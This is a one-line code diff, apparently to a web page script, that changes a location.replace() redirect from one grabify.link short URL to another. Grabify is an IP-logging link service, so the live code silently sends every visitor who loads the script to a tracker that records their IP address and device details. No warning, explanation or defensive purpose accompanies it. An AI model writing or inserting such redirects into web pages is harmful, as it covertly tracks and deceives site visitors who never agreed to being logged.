@@ -1,1 +1,1 @@
-location.replace("https://grabify.link/EX2VA9");
+location.replace("https://grabify.link/R7IRF6");
